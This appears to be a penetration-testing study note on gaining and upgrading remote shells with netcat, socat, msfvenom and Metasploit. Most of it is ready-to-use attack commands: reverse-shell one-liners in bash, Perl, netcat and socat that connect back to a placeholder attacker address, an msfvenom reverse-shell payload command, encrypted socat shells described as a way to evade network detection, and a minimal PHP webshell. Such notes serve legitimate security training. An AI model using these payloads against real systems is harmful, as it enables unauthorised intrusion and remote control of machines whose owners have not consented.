## Introduction to Shells

A shell is a command-line interface that allows users to interact with the operating system. It interprets the commands entered by the user and executes the corresponding operations. Shells are fundamental for system administration, programming, and various automation tasks.

---

## Tools

Various tools are used to interact with shells, establish connections, and manage network communications. Two prominent tools in this context are Netcat and Socat.

---

## Types of Shell

There are different types of shells, each serving distinct purposes:

1. **Interactive Shells**: Allow users to interact with the system in real-time, executing commands and receiving immediate feedback.
2. **Non-Interactive Shells**: Execute scripts and commands without user interaction.
3. **Reverse Shells**: The target system connects back to the attacker's system, providing control over the target.
4. **Bind Shells**: The target system opens a port and waits for an incoming connection from the attacker.

---

## Netcat

Netcat, often referred to as the "Swiss Army Knife" of networking, is a versatile tool used for reading from and writing to network connections using TCP or UDP. It's commonly used to establish simple connections and transfer data.

### Basic Netcat Usage

- **Listening for Connections**:

  ```bash
  nc -lvp 4444
  ```

  This command sets up Netcat to listen on port 4444.

- **Connecting to a Listener**:

  ```bash
  nc <target-ip> 4444
  ```

  This command connects to a Netcat listener on the target IP and port 4444.

## Netcat Shell Stabilisation

When gaining a shell through Netcat, the initial shell might be unstable and lack certain features. Stabilising the shell involves several steps to make it fully interactive and functional.

### Steps for Stabilising a Netcat Shell

1. **Spawn a TTY Shell**:

   ```bash
   python -c 'import pty; pty.spawn("/bin/bash")'
   ```

2. **Background the Shell**: Press `Ctrl+Z` to background the shell.

3. **Set Raw Mode and Foreground the Shell**:

   ```bash
   stty raw -echo
   fg
   ```

4. **Export TERM Variable**:

   ```bash
   export TERM=xterm
   ```

---

## Socat

Socat is a more advanced networking tool compared to Netcat. It supports various protocols and provides more robust features for handling network connections.

### Basic Socat Usage

- **Setting Up a Listener**:

  ```bash
  socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
  ```

  This command sets up Socat to listen on port 4444 and execute `/bin/bash` for incoming connections.

- **Connecting to a Listener**:

  ```bash
  socat TCP:<target-ip>:4444 EXEC:/bin/bash
  ```

  This command connects to a Socat listener on the target IP and port 4444, executing `/bin/bash`.

### Socat Shell Stabilisation

Socat can create a more stable and interactive shell compared to Netcat. Hereâ€™s a command for achieving this:

```bash
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

- **Options Explained**:
  - `pty`: Allocates a pseudoterminal, stabilising the shell.
  - `stderr`: Ensures error messages are shown.
  - `sigint`: Passes Ctrl+C commands to the subprocess.
  - `setsid`: Runs the process in a new session.
  - `sane`: Normalises the terminal.

### Using Netcat and Socat Together

Netcat is initially used to establish a basic connection to the compromised system, which provides a non-interactive shell. Once this basic connection is established, the socat command is used to upgrade the session to a fully interactive terminal. This is achieved by linking to the listener running on the attacker's machine and creating an interactive bash session with additional options to ensure terminal stability and proper handling of input/output.

#### Example Workflow

1. **Establish a Basic Connection with Netcat**:

   On the attacker's machine, set up a listener:

   ```bash
   nc -lvp 4444
   ```

   On the target machine, connect back to the attacker:

   ```bash
   nc <attacker-ip> 4444 -e /bin/bash
   ```

2. **Upgrade to an Interactive Shell with Socat**:

   On the attacker's machine, after receiving the non-interactive shell, execute the following command to set up a more stable interactive shell:

   ```bash
   socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
   ```

   This command creates an interactive bash session with enhanced stability and proper handling of terminal input/output.

By combining Netcat and Socat, you can establish an initial connection and then upgrade it to a fully interactive and stable shell, allowing for more effective control over the target system.

## Socat Encrypted Shells

Socat supports encrypted connections, enhancing security. This is useful for evading network detection systems.

### Setting Up an Encrypted Listener

```bash
socat OPENSSL-LISTEN:4444,reuseaddr,fork,cert=server.pem,verify=0 EXEC:/bin/bash
```

### Connecting to an Encrypted Listener

```bash
socat OPENSSL:<target-ip>:4444,verify=0 EXEC:/bin/bash
```

### Common Shell Payloads

Common shell payloads are used in various exploitation scenarios to gain control over a target system. These payloads can be generated using tools like Metasploit and msfvenom. For a detailed guide on generating and using shell payloads with Metasploit, refer to [this comprehensive guide](https://gnar1zard.github.io/gnar_blog/2024/06/25/Pentesting-Metasploit/).

### Examples

- **Bash Reverse Shell**:

  ```bash
  bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
  ```

- **Perl Reverse Shell**:

  ```perl
  perl -e 'use Socket;$i="<attacker-ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  ```

## msfvenom

msfvenom is a tool for generating various types of payloads used in penetration testing. It combines the functionalities of msfpayload and msfencode.

### Basic Usage

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f elf -o shell.elf
```

This command generates a reverse TCP shell payload for Linux in ELF format.

---

## Metasploit multi/handler

Metasploit's `multi/handler` is a versatile exploit handler used to receive connections from payloads generated by msfvenom or other methods.

### Setting Up a Listener

1. **Start Metasploit**:

   ```bash
   msfconsole
   ```

2. **Configure multi/handler**:

   ```bash
   use exploit/multi/handler
   set payload linux/x86/shell_reverse_tcp
   set LHOST <attacker-ip>
   set LPORT 4444
   exploit
   ```

---

## WebShells

WebShells are scripts uploaded to a web server to gain remote control over it. They can be written in various languages such as PHP, ASP, or JSP.

### Example PHP WebShell

```php
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
?>
```

This simple WebShell executes commands sent via the `cmd` parameter in a web request.
